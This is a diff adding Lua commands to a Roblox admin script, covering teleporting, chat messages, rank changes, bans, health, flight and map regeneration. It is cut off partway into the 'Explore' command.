+Root.AddCommand(
+'Brightness',
+1,
+{
+	'brightness';
+},
+function(Player, Arguments)
+	game:service'Lighting'.Brightness = tonumber(Arguments[1])
+end
+)
+Root.AddCommand(
+'Ambient',
+1,
+{
+	'ambience';
+	'ambient';
+},
+function(Player, Arguments)
+	game:service'Lighting'.Ambient = Color3.new(Arguments[1] / 255, Arguments[2] / 255, Arguments[3] / 255)
+end
+)
+Root.AddCommand(
+'Follow',
+1,
+{
+	'follow'
+},
+function(Player, Arguments)
+	local arg1=Arguments[1]
+	table.remove(Arguments,1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			Root.FollowPlayer(v, Root.Join(Arguments))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Character',
+1,
+{
+	'char'
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	local fatid = Arguments[2]
+	if tostring(Arguments[2]) == tonumber(Arguments[2]) then
+	else
+		pcall(function() fatid = game:GetService'Players':GetUserIdFromNameAsync(Arguments[2]) end)
+	end
+	for i, v in pairs(Players) do
+		thread(function()
+			v.CharacterAppearanceId = tonumber(fatid)
+			local c = v.Character.Head.CFrame
+			v:LoadCharacter()
+			wait()
+			v.Character.HumanoidRootPart.CFrame = c
+		end)
+	end
+end
+)
+Root.AddCommand(
+'UnCharacter',
+3,
+{
+	'unchar',
+	'normal'
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	for i, v in pairs(Players) do
+		thread(function()
+			v.CharacterAppearanceId = 0
+			local c = v.Character.Head.CFrame
+			v:LoadCharacter()
+			wait()
+			v.Character.HumanoidRootPart.CFrame = c
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Teleport',
+1,
+{
+	'tp';
+	'tele';
+	'teleport'
+},
+function(Player, Arguments)
+	local player = Root.GetPlayers(Player, Arguments[2])[1]
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		spawn(function()
+			if v ~= player then
+				v.Character.Humanoid.Jump = true
+				wait()
+				v.Character.HumanoidRootPart.CFrame = player.Character.Head.CFrame
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Bring',
+1,
+{
+	'bring';
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		spawn(function()
+			if v ~= player then
+				v.Character.Humanoid.Jump = true
+				wait()
+				v.Character.HumanoidRootPart.CFrame = Player.Character.Head.CFrame
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'To',
+1,
+{
+	'to';
+	'goto';
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		spawn(function()
+			if v ~= player then
+				Player.Character.Humanoid.Jump = true
+				wait()
+				Player.Character.HumanoidRootPart.CFrame = v.Character.Head.CFrame
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Logs',
+2,
+{
+	'logs'
+},
+function(Player, Arguments)
+	wait()
+	local ToScroll = {}
+	for i, v in pairs(Root.ServerLogs) do
+		ToScroll[#Root.ServerLogs - i] = v[3]..'s| '..v[1]
+	end
+	Root.FireClient(Player, 'ScrollGui', 'Server Logs', game:service'HttpService':JSONEncode(ToScroll))
+end
+)
+--[[Root.AddCommand(
+'[LibertyA-Devs] Verify',
+0,
+{'ver','verify','login'},
+function(Player, Arguments)
+local Ranks={}
+if Player:GetRankInGroup(2684242) >= 253 then
+Root.Ping(Player, '[Success]: You have successfully verified as an LibertyA Developer. Your rank is now 5'),'Lime green')
+Root.Ranks[Player.userId]=5
+else
+Root.Ping(Player, '[Failed]: Sorry, you cannot verify because you are not an LibertyA Developer!','Really red')
+end
+)]]
+Root.AddCommand(
+'SayChat',
+1,
+{
+	'saychat';
+	'mechat';
+},
+function(Player, Arguments)
+	for i,v in pairs(Root.GetRawPlayers()) do
+		Root.OxChat(v,Player.Name,Root.Join(Arguments))
+		Root.FireClient(v, 'MakeChat', '['..Player.Name..']: '..Root.Join(Arguments), BrickColor.new(Root.RankColors[Root.GetRank(Player)]).Color)
+end
+end
+)
+Root.AddCommand(
+'Private Message',
+1,
+{
+	'pm'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	Root.FireClient(Player, 'MakeChat', 'To ['..arg1..']: '..Root.Join(Arguments), BrickColor.new(Root.RankColors[Root.GetRank(Player)]).Color)
+	Root.OxChat(Player,'To '..arg1,Root.Join(Arguments))
+	Root.OxChat(v,Player.Name,Root.Join(Arguments))
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		Root.OxChat(v,'From '..Player.Name,Root.Join(Arguments))
+		Root.FireClient(v, 'MakeChat', 'From ['..Player.Name..']: '..Root.Join(Arguments), BrickColor.new(Root.RankColors[Root.GetRank(Player)]).Color)
+	end
+end
+)
+Root.AddCommand(
+'Throne',
+1,
+{
+	'throne'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+		table.insert(Objects,require(329713729)(v))
+		end)
+	end
+end)
+Root.AddCommand(
+'Sword',
+1,
+{
+	'sword'
+},
+function(Player, Arguments)
+	local sword = game:service'InsertService':LoadAsset(125013769):children()[1]
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		sword:clone().Parent = v.Backpack
+	end
+end)
+Root.AddCommand(
+'Rejoin',
+0,
+{
+	'rej',
+	'rejoin'
+},
+function(Player, Arguments)
+	if #Arguments == 0 then
+		Root.FireClient(Player, 'Teleport', game.PlaceId, game.JobId)
+	end
+	if #Arguments == 1 and Arguments[1]:lower() == 'ds' then
+		Root.FireClient(Player, 'Teleport', game.PlaceId)
+	elseif #Arguments == 1 then
+		for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+			if Root.GetRank(Player) > Root.GetRank(v) then
+				Root.FireClient(v, 'Teleport', game.PlaceId, game.JobId)
+			end
+		end
+	elseif #Arguments == 2 and Arguments[2]:lower() == 'ds' then
+		for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+			if Root.GetRank(Player) > Root.GetRank(v) and Root.GetRank(Player) >= 2 then
+				Root.FireClient(v, 'Teleport', game.PlaceId)
+			end
+		end
+	end
+end
+)
+Root.AddCommand(
+'Place',
+1,
+{
+	'place'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		--pcall(function()
+		local FUNCID = #Root.TabFunctions + math.random(1, 999999)
+		Root.TabFunctions[FUNCID] = function(ToTeleport)
+			if ToTeleport then
+			
+				Root.FireClient(v, 'Teleport', tonumber(Arguments[2]))
+			else
+			end
+			
+		end
+		Root.FireClient(v, 'VoteGui', 'Teleport to game '..game:service'MarketplaceService':GetProductInfo(tonumber(Arguments[2])).Name or (316057865)..'?', 'Place Teleport', FUNCID)
+		--end)
+	end
+end
+)
+Root.AddCommand(
+'Vote',
+1,
+{
+	'vote'
+},
+function(Player, Arguments)
+	local Arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, Arg1)) do
+		--pcall(function()
+		local FUNCID = #Root.TabFunctions + math.random(1, 999999)
+		Root.TabFunctions[FUNCID] = function(ToTeleport)
+			if ToTeleport then
+				Root.Ping(Player, v.Name..' answered yes to your vote.')
+			else
+				Root.Ping(Player, v.Name..' answered no to your vote.')
+			end
+			
+		end
+		Root.FireClient(v, 'VoteGui', ''..Root.Join(Arguments), 'Vote', FUNCID)
+		--end)
+	end
+end
+)
+Root.AddCommand(
+'Damage',
+1,
+{
+	'damage'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.Health = p.Health - tonumber(Arguments[2])
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Health',
+1,
+{
+	'health'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.MaxHealth = tonumber(Arguments[2])
+					wait()
+					p.Health = tonumber(Arguments[2])
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'clean',
+0,
+{
+	'clean'
+},
+function(Player, Arguments)
+	for i, v in pairs(workspace:children()) do
+		if v:IsA"Accoutrement" or v:IsA'Tool' then
+			v:remove''
+		elseif v:IsA'Hint' or v:IsA'Message' then
+			v.Text = ''
+		end
+	end
+end
+)
+Root.AddCommand(
+'clear',
+2,
+{
+	'clear'
+},
+function(Player, Arguments)
+	for i, v in pairs(Objects) do
+		v:Destroy()
+	end
+	Objects = {}
+	for i, v in pairs(Jails) do
+		if not Root.GetRawPlayersNamed()[v.Player] then
+			v.Jail:Destroy()
+		end
+	end
+end
+)
+Root.AddCommand(
+'Smite',
+2,
+{
+	'smite'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if v and v.Character then
+			spawn(function()
+				Root.Smite(v)
+			end)
+		end
+	end
+end
+)
+Root.AddCommand(
+'Remove tools',
+1,
+{
+	'rtools',
+	'rt',
+	'removetools'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Backpack:children()) do
+				if p:IsA'Tool' or p:IsA'HopperBin' then
+					p:Destroy()
+				end
+			end
+		end)
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Tool' or p:IsA'HopperBin' then
+					p:Destroy()
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Trip',
+2,
+{
+	'trip'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			v.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, 0, math.rad(180))
+		end)
+	end
+end,
+true
+)
+Root.AddCommand(
+'Message',
+1,
+{
+	'm'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:service'Players':GetPlayers()) do
+		pcall(function()
+			Root.FireClient(v, 'MessageGui', Root.Join(Arguments), Player.Name)
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'SystemMessage',
+1,
+{
+	'sm'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:service'Players':GetPlayers()) do
+		pcall(function()
+			Root.FireClient(v, 'MessageGui', Root.Join(Arguments), '')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Hint',
+1,
+{
+	'h'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:service'Players':GetPlayers()) do
+		pcall(function()
+			Root.FireClient(v, 'HintGui', '['..Player.Name..']: '..Root.Join(Arguments))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'SystemHint',
+1,
+{
+	'sh'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:service'Players':GetPlayers()) do
+		pcall(function()
+			Root.FireClient(v, 'HintGui', Root.Join(Arguments))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'FPS',
+0,
+{
+	'fps'
+},
+function(Player, Arguments)
+Root.FireClient(Player,'FPSCheck')
+end
+)
+Root.AddCommand(
+'Ping',
+0,
+{
+	'ping'
+},
+function(Player, Arguments)
+	for i, v in pairs(Arguments) do
+		Root.Ping(Player, v)
+	end
+end
+)
+Root.AddCommand(
+'Servertime',
+0,
+{
+	'servt'
+},
+function(Player, Arguments)
+	Root.Ping(Player, time()..' s')
+end
+)
+Root.AddCommand(
+'Un-Rank',
+2,
+{
+	'unrank',
+	'norank', -- many ways to unrank lol...
+	'unadmin', -- aa so much
+	'noadmin',
+	'unoa',
+	'nooa',
+	'unpa',
+	'nopa',
+	'unvip',
+	'novip',
+	'unguest',
+	'noguest',
+	'unsmod',
+	'nosmod',
+	'unmod',
+	'nomod',
+	'unhmod',
+	'nohmod',
+	'unco',
+	'noco',
+	'unta',
+	'nota',
+	'unsa',
+	'nosa',
+	'unpa',
+	'nopa',
+	'unha',
+	'noha'
+},
+function(Player, Arguments)
+local newrank=0
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			local oldrank=Root.GetRank(v)
+			Root.Ranks[v.userId] = newrank
+			if oldrank < newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been promoted to Non-Admin', 'System')
+		elseif oldrank > newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been demoted to Non-Admin', 'System')
+			end
+		end
+end
+end
+)
+Root.AddCommand(
+'Temp-Admin',
+3,
+{
+	'ta',
+	'tempadmin'
+},
+function(Player, Arguments)
+local newrank=2
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			local oldrank=Root.GetRank(v)
+			Root.Ranks[v.userId] = newrank
+			if oldrank < newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been promoted to Temp-Admin', 'System')
+		elseif oldrank > newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been demoted to Temp-Admin', 'System')
+			end
+		end
+end
+end
+)
+Root.AddCommand(
+'Mod',
+2,
+{
+	'mod'
+},
+function(Player, Arguments)
+local newrank=1
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			local oldrank=Root.GetRank(v)
+			Root.Ranks[v.userId] = newrank
+			if oldrank < newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been promoted to Moderator', 'System')
+		elseif oldrank > newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been demoted to Moderator', 'System')
+			end
+		end
+end
+end
+)
+Root.AddCommand(
+'Lag Server',
+4,
+{
+	'lagsrv'
+},
+function(Player, Arguments)
+local num=tonumber(Root.Join(Arguments))
+if num and num <= 30 then
+local t=tick()+num local o=tick() repeat until tick()>t
+return 'Successfully lagged for '..tick()-o..' seconds.'
+elseif num then
+Root.Ping(Player,'Cannot lag server for more than 30 seconds.')
+else
+Root.Ping(Player,'Cannot lag due to invalid time specified.')
+end
+end
+)
+Root.AddCommand(
+'Admin',
+4,
+{
+	'admin',
+	'pa'
+},
+function(Player, Arguments)
+local newrank=3
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			local oldrank=Root.GetRank(v)
+			Root.Ranks[v.userId] = newrank
+			if oldrank < newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been promoted to Admin', 'System')
+		elseif oldrank > newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been demoted to Admin', 'System')
+			end
+		end
+end
+end
+)
+Root.AddCommand(
+'Owner-Admin',
+5,
+{
+	'owneradmin',
+	'oa'
+},
+function(Player, Arguments)
+local newrank=4
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			local oldrank=Root.GetRank(v)
+			Root.Ranks[v.userId] = newrank
+			if oldrank < newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been promoted to Owner', 'System')
+		elseif oldrank > newrank then
+			Root.FireClient(v, 'InfoGui', 'You have been demoted to Owner', 'System')
+			end
+		end
+end
+end
+)
+Root.AddCommand(
+'Ban',
+3,
+{
+	'ban'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		if Root.GetRank(v) < Root.GetRank(Player) then
+			Root.Ranks[v.userId] = -1
+			Root.Ranks[v.Name] = -1
+			wait()
+			Root.Kick(v, Root.Join(Arguments) or 'Banned from server.')
+		end
+end
+end
+)
+Root.AddCommand(
+'Unban',
+3,
+{
+	'unban',
+	'pardon',
+	'forgive'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.Ranks) do
+		if type(i) == 'string' and string.lower(i) == string.lower(arg1) and Root.Ranks[i] < 0 then
+			Root.Ranks[i] = 0
+		elseif type(i) == 'number' and Root.Ranks[i] < 0 and string.lower(game:service'Players':GetNameFromUserIdAsync(i)) == string.lower(arg1) then
+			Root.Ranks[i] = 0
+			pcall(function()
+				local Name = game:service'Players':GetNameFromUserIdAsync(i)
+				Root.Ranks[Name] = 0
+			end)
+		end
+end
+end
+)
+Root.AddCommand(
+'Bans',
+3,
+{
+	'bans'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.Ranks) do
+		if Root.Ranks[i] < 0 then
+			Root.Ping(Player, i..'\n Click to unban', nil, function()
+				Root.Ranks[i] = 0
+			end)
+		end
+	end
+end
+)
+Root.AddCommand(
+'Quote',
+0,
+{
+	'quote'
+},
+function(Player, Arguments)
+	Root.FireClient(Player, 'InfoGui', Root.Quotes[math.random(1, #Root.Quotes)], 'Quote')
+end
+)
+Root.AddCommand(
+'Change',
+1,
+{
+	'change'
+},
+function(Player, Arguments)
+	if #Arguments < 3 then
+		return
+	end
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			if v and v:findFirstChild("leaderstats") then 
+				for a, st in pairs(v.leaderstats:children()) do
+					if st.Name:lower():find(Arguments[2]:lower()) == 1 then
+						st.Value = string.gsub(Arguments[3]:lower(), '#inf', '2147483647')
+					end
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Reset',
+0,
+{
+	'reset',
+	'suicide'
+},
+function(Player, Arguments)
+	if #Arguments >= 1 and Arguments[1] == 'rs' then
+		Player:LoadCharacter()
+		Root.Ping(Player, 'Respawned Character.')
+	else
+		Player.Character:BreakJoints()
+		Root.Ping(Player, 'Reset Character.')
+	end
+end
+)
+Root.AddCommand(
+'Playerpoint',
+1,
+{
+	'pp',
+	'point'
+},
+function(Player, Arguments)
+	if #Arguments < 2 then
+		return
+	end
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			game:service'PointsService':AwardPoints(v.userId, tonumber(Arguments[2]))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Badge',
+1,
+{
+	'badge'
+},
+function(Player, Arguments)
+	if #Arguments < 2 then
+		return
+	end
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			game:service'BadgeService':AwardBadge(v.userId, tonumber(Arguments[2]))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Heal',
+1,
+{
+	'heal'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.Health = p.MaxHealth
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'God',
+1,
+{
+	'god'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.MaxHealth = math.huge
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Cape',
+1,
+{
+	'cape'
+},
+function(Player, Arguments)
+	local arg1=Arguments[1]
+	table.remove(Arguments,1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		thread(function()
+			pcall(function()v.Character.Cape:Destroy() end)
+			local h=Instance.new('Folder',v.Character)
+			h.Name='Cape'
+			local fl = script.Cape:clone()
+			fl.Parent = h
+			fl.Name=Root.Join(Arguments)
+			wait()
+			fl.Disabled = false
+		end)
+	end
+end
+)
+Root.AddCommand(
+'UnCape',
+1,
+{
+	'uncape'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+	thread(function()v.Character.Cape:Destroy()end)
+	end
+end
+)
+Root.AddCommand(
+'Fly',
+1,
+{
+	'fly'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			local fl = script.Fly:clone()
+			fl.Parent = v.Backpack
+			wait()
+			fl.Disabled = false
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Noclip',
+1,
+{
+	'noclip'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			local c = script['Noclip']:clone()
+			c.Parent = v.Backpack
+			wait()
+			c.Disabled = false
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Clip',
+1,
+{
+	'clip'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for a, q in pairs(v.Backpack:children()) do
+				if q.Name == 'Noclip' then
+					q:Destroy''
+				end
+			end
+		end)
+	end
+end
+)
+--[[
+Root.AddCommand(
+'UnFly',
+1,
+{
+	'unfly'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for a, q in pairs(v.Character.Torso:children()) do
+				if q.Name == "BodyGyro" or q.Name == "BodyVelocity" then
+					q:Destroy()
+				end
+			end
+		end)
+		thread(function()
+			for a, q in pairs(v.Backpack:children()) do
+				if q:FindFirstChild'IsAFly' then
+					q:Destroy''
+				end
+			end
+		end)
+		thread(function()
+			for i = 1, 100 do
+				wait()
+				v.Character.Humanoid.PlatformStand = false
+			end
+		end)
+	end
+end
+)
+--]]
+Root.AddCommand(
+'Build-Tools',
+2,
+{
+	'btools'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			local fl = script.F3X:Clone()
+			fl.Parent = v.Backpack
+			for x,d in pairs(script.LibertyAModule:GetChildren()) do
+				d:Clone().Parent = v.Backpack
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Worship',
+2,
+{
+	'worship'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			local fl = script.Worship:Clone()
+			fl.Parent = v.Backpack
+		end)
+	end
+end
+)
+Root.AddCommand(
+'NoHeal',
+1,
+{
+	'nh',
+	'noheal'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			local oldhealth = v.Character.Humanoid.Health
+			v.Character.Humanoid.Changed:connect(function()
+				wait()
+				thread(function()
+					if v.Character.Humanoid.Health > oldhealth then
+						v.Character.Humanoid.Health = oldhealth
+					elseif v.Character.Humanoid.Health ~= oldhealth then
+						oldhealth = v.Character.Humanoid.Health
+					end
+				end)
+			end)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'UnName',
+1,
+{
+	'unname',
+	'noname'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for a, mod in pairs(v.Character:children()) do
+				if mod:findFirstChild("NameTag") then
+					v.Character.Head.Transparency = 0
+					mod:Destroy()
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Kohls Sudo',
+1,
+{
+	'kohlsudo',
+	'sudok'
+},
+function(Player, Arguments)
+	if #Arguments < 2 then
+		return
+	end
+	Players = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, Players)) do
+		thread(function()
+			if Root.GetRank(Player) > Root.GetRank(v) then
+				getfenv(_G.Message).Chat(Root.Join(Arguments), v)
+			end
+	end)
+		thread(function()
+			if Root.GetRank(Player) > Root.GetRank(v) then
+				getfenv(_G.KPrintCmds).f.Chatted(v,Root.Join(Arguments))
+			end
+	end)
+	end
+end)
+Root.AddCommand(
+'Name',
+1,
+{
+	'name'
+},
+function(Player, Arguments)
+	if #Arguments < 2 then
+		return
+	end
+	Players = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, Players)) do
+		thread(function()
+			if v and v.Character and v.Character:findFirstChild("Head") then 
+				for a, mod in pairs(v.Character:children()) do
+					if mod:findFirstChild("NameTag") then
+						v.Character.Head.Transparency = 0
+						mod:Destroy()
+					end
+				end
+				local char = v.Character
+				local mod = Instance.new("Model", char)
+				mod.Name = Root.Join(Arguments)
+				local cl = char.Head:Clone()
+				cl.Parent = mod
+				local hum = Instance.new("Humanoid", mod)
+				hum.Name = "NameTag"
+				hum.MaxHealth = 0
+				hum.Health = 0
+				local weld = Instance.new("Weld", cl)
+				weld.Part0 = cl
+				weld.Part1 = char.Head
+				char.Head.Transparency = 1
+				--thread(function()
+				char.Humanoid.Changed:connect(function()
+					hum.MaxHealth = char.Humanoid.MaxHealth
+					hum.Health = char.Humanoid.Health
+				end)
+				hum.MaxHealth = char.Humanoid.MaxHealth
+				hum.Health = char.Humanoid.Health
+				--end)
+			end
+		end)
+	end
+end)
+Root.AddCommand('Nils',
+1,
+{
+	'nils'
+},
+function(Player, Arguments)
+	Root.FireClient(Player, 'Dismiss')
+	for i, v in pairs(game:service'NetworkServer':children()) do
+		if v:IsA'ServerReplicator' and v:GetPlayer().Parent == nil then
+			Root.Ping(Player, v:GetPlayer().Name, nil, function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Ping(Player, 'Name | '..v:GetPlayer().Name, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&userId="..v:GetPlayer().userId)
+				Root.Ping(Player, 'Age | '..v:GetPlayer().AccountAge..' days')
+				Root.Ping(Player, 'Id | '..v:GetPlayer().userId)
+				Root.Ping(Player, 'Rank | '..Root.RankName(Root.GetRank(v:GetPlayer())))
+				if Root.GetRank(v:GetPlayer()) < Root.GetRank(Player) and Root.GetRank(Player) >= 3 then
+					Root.Ping(Player, 'NilCrash', 'Really red', function()
+						Root.Kick(v:GetPlayer())
+					end)
+				end
+			end, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&userId="..v:GetPlayer().userId)
+		end
+	end
+end
+)
+Root.AddCommand('Dismiss',
+1,
+{
+	'dismiss';
+	'clearorbs';
+},
+function(Player, Arguments)
+	Root.FireClient(Player, 'Dismiss')
+end
+)
+Root.AddCommand('Players',
+1,
+{
+	'players';
+	'plrs'
+},
+function(Player, Arguments)
+	Root.FireClient(Player, 'Dismiss')
+	for i, v in pairs(game:service'NetworkServer':children()) do
+		if v:IsA'ServerReplicator' then
+			Root.Ping(Player, v:GetPlayer().Name, nil, function()
+				Root.FireClient(Player, 'Dismiss')
+				Root.Ping(Player, 'Name | '..v:GetPlayer().Name, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&userId="..v:GetPlayer().userId)
+				Root.Ping(Player, 'Age | '..v:GetPlayer().AccountAge..' days')
+				Root.Ping(Player, 'Id | '..v:GetPlayer().userId)
+				Root.Ping(Player, 'Rank | '..Root.RankName(Root.GetRank(v:GetPlayer())))
+				if Root.GetRank(v:GetPlayer()) < Root.GetRank(Player) and Root.GetRank(Player) >= 3 then
+					Root.Ping(Player, 'Kick', 'Really red', function()
+						Root.Kick(v:GetPlayer())
+					end)
+				end
+			end, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&userId="..v:GetPlayer().userId)
+		end
+	end
+end
+)
+Root.AddCommand(
+'Watch',
+1,
+{
+	'watch',
+	'view'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			if v and v.Character:FindFirstChild('Humanoid') then
+				Root.FireClient(Player, 'SetView', v.Character.Humanoid)
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Statue',
+3,
+{
+	'statue'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			local statue = require(318157906)(v.userId, Root.Join(Root.Split(Arguments[2], '_')), tonumber(Arguments[3] or '2.5'))
+			statue.Parent = v.Character
+			wait()
+			statue:MoveTo(v.Character.HumanoidRootPart.Position + Vector3.new(0, 0, 4))
+			table.insert(Objects,statue)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Regen Map',
+4,
+{
+	'regen'
+},
+function(Player, Arguments)
+	for i, v in pairs(workspace:children()) do
+		thread(function()
+			v:Destroy()
+		end)
+	end
+	for i, v in pairs(Root.MapBackup) do
+		local o = v:clone()
+		o.Parent = workspace
+		Root.anchorAll(o)
+	end
+	for i, v in pairs(Root.GetRawPlayers()) do
+		thread(function()
+			v:LoadCharacter()
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Rejoin',
+1,
+{
+	'rej',
+	'rejoin'
+},
+function(Player, Arguments)
+	if #Arguments == 0 then
+		Root.FireClient(Player, 'Teleport', game.PlaceId, game.JobId)
+	end
+	if #Arguments == 1 and Arguments[1]:lower() == 'ds' then
+		Root.FireClient(Player, 'Teleport', game.PlaceId)
+	elseif #Arguments == 1 then
+		for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+			Root.FireClient(v, 'Teleport', game.PlaceId, game.JobId)
+		end
+	elseif #Arguments == 2 and Arguments[2]:lower() == 'ds' then
+		for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+			Root.FireClient(Player, 'Teleport', game.PlaceId)
+		end
+	end
+end
+)
+Root.AddCommand(
+'UnGod',
+3,
+{
+	'ungod'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		thread(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'Humanoid' then
+					p.MaxHealth = 100
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Explore',
+4,
+{
+	'explore'
+},
+function(Player, Arguments)
+	if Arguments[1] == nil then
+		Arguments = {
+			'Workspace'
+		}
+	end
